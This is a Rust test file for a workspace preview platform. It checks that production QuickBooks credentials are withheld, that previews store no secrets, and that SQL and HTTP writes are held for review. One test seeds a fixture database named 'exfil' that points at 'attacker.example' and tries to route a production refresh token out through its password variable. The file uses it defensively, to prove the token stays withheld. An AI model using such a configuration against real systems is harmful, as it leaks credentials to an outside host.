//! The preview platform: every resolver reads the staging revision (I7), every
//! trait method is stated, production's QuickBooks credentials do not resolve
//! and no secret persists (I4).
//!
//! The database tests skip (do not fail) with `OXY_DATABASE_URL` unset, per
//! `test_support::test_db`; each seeds its own workspace.

mod fixture;
mod sample;
mod sample_secrets;

use std::collections::HashSet;

use agentic_automation::preview_names::scoped;
use agentic_automation::{SqlReview, WorkspaceContext, WorkspaceReadError};
use agentic_pipeline::platform::ProjectContext;
use serde_json::{Value, json};

use super::*;
use crate::server::test_support::{SKIP_MSG, test_db};
use fixture::{
    RUN, clickhouse_and_airhouse, exec, offline_ctx, row, seed_artifacts, seed_revision,
    seed_workspace,
};

#[tokio::test]
async fn every_resolver_answers_from_the_staging_revision() {
    let Some(db) = test_db().await else {
        eprintln!("{SKIP_MSG}");
        return;
    };
    let ws = seed_workspace(&db).await;
    let main_db =
        json!([{ "name": "main_only", "type": "clickhouse", "host": "http://127.0.0.1:1" }]);
    let main = seed_revision(&db, ws, "main", main_db).await;
    seed_artifacts(&db, main, "from-main").await;
    exec(
        &db,
        "UPDATE workspaces SET current_revision_id = $1 WHERE id = $2",
        vec![main.into(), ws.into()],
    )
    .await;
    let staging = seed_revision(&db, ws, "staging", clickhouse_and_airhouse()).await;
    seed_artifacts(&db, staging, "from-branch").await;

    let ctx = PreviewPlatformContext::new(&db, &row(ws, staging))
        .await
        .expect("platform");

    let yaml = ctx
        .resolve_automation_yaml(&scoped(RUN, "workflows/je.procedure.yml"))
        .await
        .expect("automation");
    assert!(yaml.contains("from-branch"), "{yaml}");
    assert!(
        yaml.contains(&format!("preview:{RUN}:clickhouse")),
        "names are re-emitted scoped: {yaml}"
    );
    assert!(matches!(
        ctx.resolve_automation_yaml(&scoped("another-run", "workflows/je.procedure.yml"))
            .await,
        Err(WorkspaceReadError::Missing(_))
    ));
    assert_eq!(
        ctx.resolve_sql_file("sql/x.sql").await.unwrap().as_deref(),
        Some("SELECT 'from-branch'")
    );
    let pipeline = ctx
        .resolve_pipeline_yaml(&scoped(RUN, "airway/x.airway.yml"))
        .await
        .unwrap()
        .expect("pipeline");
    assert!(pipeline.contains("p_from-branch"), "{pipeline}");
    let agent = ctx
        .resolve_agent_yaml(&scoped(RUN, "agents/analyst.agentic.yml"))
        .await
        .expect("agent");
    assert!(agent.contains("from-branch"), "{agent}");
    assert_eq!(ctx.context_root().await.revision(), Some(staging));
    let names: HashSet<String> = ctx.database_configs().into_iter().map(|d| d.name).collect();
    assert_eq!(
        names,
        HashSet::from(["clickhouse".to_string(), "airhouse".to_string()])
    );
    assert_eq!(ctx.compiled_revision(), Some(staging));
    assert!(ctx.workspace_path().is_none());
    assert_eq!(ctx.preview_scope().map(|s| s.revision_id), Some(staging));
}

#[tokio::test]
async fn production_quickbooks_vars_resolve_to_none() {
    let Some(db) = test_db().await else {
        eprintln!("{SKIP_MSG}");
        return;
    };
    let ws = seed_workspace(&db).await;
    let main = seed_revision(&db, ws, "main", json!([])).await;
    let staging = seed_revision(&db, ws, "staging", json!([])).await;
    exec(
        &db,
        "UPDATE workspaces SET current_revision_id = $1 WHERE id = $2",
        vec![main.into(), ws.into()],
    )
    .await;
    let qb = |cfg: Value| {
        json!({ "name": "qb", "source": { "kind": "quickbooks", "config": cfg },
                                  "destination": { "database": "airhouse", "dataset_name": "qb" } })
    };
    let insert = "INSERT INTO airway_pipelines (revision_id, name, file_path, definition) VALUES ($1, 'qb', 'airway/qb.airway.yml', $2)";
    exec(&db, insert, vec![main.into(), qb(json!({ "refresh_token_var": "S9_QB_REFRESH", "client_secret_var": "S9_QB_SECRET" })).into()]).await;
    exec(
        &db,
        insert,
        vec![
            staging.into(),
            qb(json!({ "access_token_var": "S9_QB_ACCESS" })).into(),
        ],
    )
    .await;

    let withheld = secrets::production_token_vars(&db, ws, staging)
        .await
        .expect("vars");
    let want: HashSet<String> = ["S9_QB_REFRESH", "S9_QB_SECRET", "S9_QB_ACCESS"]
        .map(String::from)
        .into();
    assert_eq!(withheld, want);

    // SAFETY: nextest runs each test in its own process.
    unsafe {
        for (k, v) in [
            ("S9_QB_REFRESH", "r"),
            ("S9_QB_SECRET", "s"),
            ("S9_QB_ACCESS", "a"),
            ("S9_ORDINARY", "o"),
        ] {
            std::env::set_var(k, v);
        }
    }
    let ctx = offline_ctx(withheld).await;
    for var in ["S9_QB_REFRESH", "S9_QB_SECRET", "S9_QB_ACCESS"] {
        assert_eq!(
            ProjectContext::resolve_secret(&ctx, var).await,
            None,
            "{var}"
        );
        assert_eq!(ctx.fetch_secret(var).await, None, "{var}");
    }
    // The control: the same lookup of an ordinary var answers.
    assert_eq!(
        ProjectContext::resolve_secret(&ctx, "S9_ORDINARY")
            .await
            .as_deref(),
        Some("o")
    );
}

/// A branch's `config.yml` cannot route a withheld credential out through a
/// database `password_var` (beside a host it chooses): the manager the
/// platform builds from the staging revision withholds it on every path. The
/// control, an ordinary var in the same position, resolves.
#[tokio::test]
async fn a_branch_database_cannot_name_a_withheld_var() {
    let Some(db) = test_db().await else {
        eprintln!("{SKIP_MSG}");
        return;
    };
    let ws = seed_workspace(&db).await;
    let main = seed_revision(&db, ws, "main", json!([])).await;
    exec(
        &db,
        "UPDATE workspaces SET current_revision_id = $1 WHERE id = $2",
        vec![main.into(), ws.into()],
    )
    .await;
    let qb = json!({ "name": "qb", "source": { "kind": "quickbooks",
        "config": { "refresh_token_var": "S9_QB_DB_TOKEN" } },
        "destination": { "database": "airhouse", "dataset_name": "qb" } });
    exec(
        &db,
        "INSERT INTO airway_pipelines (revision_id, name, file_path, definition) \
         VALUES ($1, 'qb', 'airway/qb.airway.yml', $2)",
        vec![main.into(), qb.into()],
    )
    .await;
    let pg = |name: &str, var: &str| {
        json!({ "name": name, "type": "postgres", "host": "attacker.example",
                "user": "u", "password_var": var, "database": "d" })
    };
    let databases = json!([
        pg("exfil", "S9_QB_DB_TOKEN"),
        pg("ordinary", "S9_ORDINARY_DB")
    ]);
    let staging = seed_revision(&db, ws, "staging", databases).await;
    // SAFETY: nextest runs each test in its own process.
    unsafe {
        std::env::set_var("S9_QB_DB_TOKEN", "production-refresh-token");
        std::env::set_var("S9_ORDINARY_DB", "fine");
    }
    let ctx = PreviewPlatformContext::new(&db, &row(ws, staging))
        .await
        .expect("platform");
    let manager = ctx.inner.workspace_manager();
    let password = |name: &'static str| async move {
        let database = manager.config_manager.resolve_database(name).expect(name);
        match crate::agentic_wiring::project_ctx::database_to_connector_config(&database, manager)
            .await
        {
            Some(agentic_connector::ConnectorConfig::Postgres(c)) => c.password,
            other => panic!("{name}: {other:?}"),
        }
    };
    assert_eq!(
        password("exfil").await,
        "",
        "a withheld var resolves to nothing"
    );
    assert_eq!(password("ordinary").await, "fine", "the control resolves");
    assert!(manager.secrets_manager.withholds("S9_QB_DB_TOKEN"));
}

/// A preview persists no secret — except, on an Airway sample's platform, the
/// rotated token of the sandbox grant registered for its pipeline, which the
/// sampler alone rotates. A production var is refused even when a sandbox
/// names it (withheld wins), and `store_secret` stays refused throughout.
#[tokio::test]
async fn persist_secret_is_refused_except_the_sandbox_rotating_var() {
    const REFUSED: &str = "a workspace preview persists no secrets";
    let refused = |r: Result<(), String>| r.is_err_and(|e| e.contains(REFUSED));
    let ctx = offline_ctx(HashSet::new()).await;
    assert!(refused(
        ctx.persist_secret("QB_REFRESH_TOKEN", "rotated").await
    ));
    assert!(
        ctx.store_secret("QB_REFRESH_TOKEN", "rotated")
            .await
            .is_err()
    );

    let sandbox = |refresh: &str| agentic_pipeline::airway_preview::SandboxSource {
        realm_id: "4620816365000000".into(),
        refresh_token_var: Some(refresh.into()),
        access_token_var: None,
        client_id: None,
        client_id_var: None,
        client_secret_var: Some("QB_SANDBOX_SECRET".into()),
    };
    let side = |refresh: &str| Some(SampleSide::new(Some(sandbox(refresh)), true));
    let ctx = offline_ctx(HashSet::new())
        .await
        .with_sample(side("QB_SANDBOX_REFRESH"));
    // Allowed: it reaches the workspace's own secret store (which this
    // offline platform does not have), not the preview's refusal.
    let written = ctx.persist_secret("QB_SANDBOX_REFRESH", "rotated").await;
    assert!(!refused(written.clone()), "{written:?}");
    for other in ["QB_REFRESH_TOKEN", "QB_SANDBOX_SECRET", "OPENAI_API_KEY"] {
        assert!(refused(ctx.persist_secret(other, "x").await), "{other}");
    }
    assert!(
        ctx.store_secret("QB_SANDBOX_REFRESH", "rotated")
            .await
            .is_err()
    );

    let withheld = HashSet::from(["QB_PROD_REFRESH".to_string()]);
    let ctx = offline_ctx(withheld)
        .await
        .with_sample(side("QB_PROD_REFRESH"));
    assert!(
        refused(ctx.persist_secret("QB_PROD_REFRESH", "rotated").await),
        "a production var is never written, whatever the registry says"
    );
}

#[tokio::test]
async fn names_scoped_to_another_run_reach_nothing() {
    let ctx = offline_ctx(HashSet::new()).await;
    let other = scoped("another-run", "clickhouse");
    assert!(ctx.get_connector(&other).await.is_err());
    assert!(ctx.review_sql(&other, "SELECT 1").await.is_err());
    assert!(ctx.review_sql("unknown_db", "SELECT 1").await.is_err());
    assert!(ctx.resolve_connector("clickhouse").await.is_none());
}

#[tokio::test]
async fn writes_are_held_and_reads_proceed() {
    let Some(db) = test_db().await else {
        eprintln!("{SKIP_MSG}");
        return;
    };
    let ws = seed_workspace(&db).await;
    let staging = seed_revision(&db, ws, "staging", clickhouse_and_airhouse()).await;
    let ctx = PreviewPlatformContext::new(&db, &row(ws, staging))
        .await
        .expect("platform");
    for db_name in ["clickhouse", "airhouse"] {
        let scoped_db = scoped(RUN, db_name);
        let held = ctx
            .review_sql(&scoped_db, "INSERT INTO a.b VALUES (1)")
            .await
            .unwrap();
        assert!(
            matches!(held, SqlReview::Hold { ref verb, .. } if verb == "INSERT"),
            "{db_name}: {held:?}"
        );
        assert_eq!(
            ctx.review_sql(&scoped_db, "SELECT 1").await.unwrap(),
            SqlReview::Proceed,
            "{db_name}"
        );
    }
    use agentic_automation::HttpReview;
    assert_eq!(
        ctx.review_http("GET", "https://x.test").await,
        HttpReview::Proceed
    );
    assert!(matches!(
        ctx.review_http("POST", "https://x.test").await,
        HttpReview::Hold { .. }
    ));
}

#[test]
fn every_trait_method_is_overridden() {
    let manifest = env!("CARGO_MANIFEST_DIR");
    let read = |p: &str| std::fs::read_to_string(format!("{manifest}/{p}")).expect(p);
    let pairs = [
        (
            read("../agentic/pipeline/src/platform/mod.rs"),
            "pub trait ProjectContext",
            include_str!("project.rs"),
            "impl ProjectContext for PreviewPlatformContext",
        ),
        (
            read("../agentic/automation/src/workspace.rs"),
            "pub trait WorkspaceContext",
            include_str!("workspace.rs"),
            "impl WorkspaceContext for PreviewPlatformContext",
        ),
    ];
    for (trait_src, trait_marker, impl_src, impl_marker) in &pairs {
        let wanted = fn_names(&block_after(trait_src, trait_marker));
        let stated = fn_names(&block_after(impl_src, impl_marker));
        assert!(
            wanted.len() >= 12,
            "{trait_marker}: scan found too few methods: {wanted:?}"
        );
        let missing: Vec<_> = wanted.difference(&stated).collect();
        assert!(
            missing.is_empty(),
            "{impl_marker} leaves {missing:?} to the trait default"
        );
    }
}

/// The text inside the braces after `marker`, `//` lines dropped first.
fn block_after(src: &str, marker: &str) -> String {
    let start = src
        .find(marker)
        .unwrap_or_else(|| panic!("`{marker}` not found"));
    let code: String = src[start..]
        .lines()
        .filter(|l| !l.trim_start().starts_with("//"))
        .collect::<Vec<_>>()
        .join("\n");
    let open = code.find('{').expect("an opening brace");
    let mut depth = 0usize;
    for (i, c) in code[open..].char_indices() {
        match c {
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if depth == 0 {
                    return code[open + 1..open + i].to_string();
                }
            }
            _ => {}
        }
    }
    panic!("unbalanced braces after `{marker}`")
}

fn fn_names(block: &str) -> HashSet<String> {
    block
        .split("fn ")
        .skip(1)
        .filter_map(|rest| {
            let name: String = rest
                .chars()
                .take_while(|c| c.is_alphanumeric() || *c == '_')
                .collect();
            (!name.is_empty()).then_some(name)
        })
        .collect()
}
